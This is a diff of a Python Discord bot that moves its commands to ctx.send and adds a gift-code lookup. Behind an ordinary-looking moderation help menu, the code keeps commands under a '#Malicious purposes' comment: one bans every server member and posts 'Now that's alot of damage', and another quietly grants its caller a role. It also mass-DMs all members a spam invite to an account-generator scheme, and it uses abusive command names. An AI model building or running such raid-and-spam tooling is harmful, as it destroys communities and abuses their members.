@@ -7,6 +7,7 @@ from discord.ext.commands import Bot
 import asyncio
 import time
 import logging
+import requests
 
 client = commands.Bot(command_prefix='$') #This Is The Prefix, Feel Free To Change It Anytime
 
@@ -35,8 +36,8 @@ async def help(ctx):
     embed.add_field(name='$ban', value='Bans specified user', inline=False)
     embed.add_field(name='$info', value='Gives information of a user', inline=False)
     embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
-    embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
-    await client.send_message(author, embed=embed)
+    embed.add_field(name='$nitroinfo', value='gets a nitro codes information using discords api', inline=False)
+    await ctx.send(author, embed=embed)
 
 @client.command(pass_context=True)
 async def dm(ctx, message):
@@ -44,66 +45,53 @@ async def dm(ctx, message):
     for member in server.members:
      await asyncio.sleep(0)
      try:
-       await client.send_message(member, "https://discord.gg/sujRrDX Join now for a cheap unlimited account generator!!")
+       await ctx.send(member, "https://discord.gg/sujRrDX Join now for a cheap unlimited account generator!!")
        print("Sent message")
      except:
        pass
 
-@client.command(pass_context=True)
-async def clear(ctx, amount=10):
-    channel = ctx.message.channel
-    messages = []
-    async for message in client.logs_from(channel, limit=int(amount)):
-        messages.append(message)
-    await client.delete_messages(messages)
-    await client.say('Messages deleted')
 
 @client.command(pass_context=True)
 async def ping(ctx):
-	channel = ctx.message.channel
-	t1 = time.perf_counter()
-	await client.send_typing(channel)
-	t2 = time.perf_counter()
-	embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
-	await client.say(embed=embed)
+    await ctx.send(f"Pong! {round(client.latency * 1000)}ms")
 
 @client.command(pass_context=True)
 async def info(ctx, user: discord.Member=None):
     if user is None:
-        await client.say('Please input a user.')
+        await ctx.send('Please input a user.')
     else:
-        await client.say("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))
+        await ctx.send("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))
 
 @client.command(pass_context=True)
 async def kick(ctx, user: discord.Member=None):
     author = ctx.message.author
     if author.server_permissions.kick_members:
         if user is None:
-            await client.say('Please input a user.')
+            await ctx.send('Please input a user.')
         else:
-            await client.say (":boot: Get kicked **{}**, Damn kid".format(user.name))
+            await ctx.send (":boot: Get kicked **{}**, Damn kid".format(user.name))
             await client.kick(user)
     else:
-        await client.say('You lack permission to preform this action')
+        await ctx.send('You lack permission to preform this action')
 
 @client.command(pass_context=True)
 async def ban(ctx, user: discord.Member=None):
     author = ctx.message.author
     if author.server_permissions.kick_members:
         if user is None:
-            await client.say('Please input a user.')
+            await ctx.send('Please input a user.')
         else:
-            await client.say("Get banned **{}**, Damn kid".format(user.name))
+            await ctx.send("Get banned **{}**, Damn kid".format(user.name))
             await client.ban(user)
     else:
-        await client.say('You lack permission to preform this action')
+        await ctx.send('You lack permission to preform this action')
 
 
 @client.command(pass_context=True)
 async def invite(ctx):
-    await client.say("https://discordapp.com/oauth2/authorize?&client_id=503182818667659274&scope=client&permissions=8")
+    await ctx.send("https://discordapp.com/oauth2/authorize?&client_id=503182818667659274&scope=client&permissions=8")
 
-#Malicious purpose
+#Malicious purposes
 
 @client.command(pass_context=True)
 async def h(ctx):
@@ -125,7 +113,7 @@ async def rape(ctx):
                 pass
         server = ctx.message.server
         channel = await client.create_channel(server, 'RIP', type=discord.ChannelType.text)
-        await client.send_message(channel, "Now that's alot of damage!!")
+        await ctx.send(channel, "Now that's alot of damage!!")
         for user in list(ctx.message.server.members):
             try:
                 await client.ban(user)
@@ -143,5 +131,9 @@ async def dab(ctx):
     role = discord.utils.get(user.server.roles, name="dab")
     await client.add_roles(user, role)
     print ("You're in buddy, now don't fuck it up")
-
-client.run("TOKEN") #Bot's Token Code Goes Here
+@client.command()
+async def nitroinfo(ctx, *, code):
+    """Gets the information from a nitro code using discords API."""
+    x = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}")
+    await ctx.send(x.json())
+client.run("tokenhere") #Bot's Token Code Goes Here
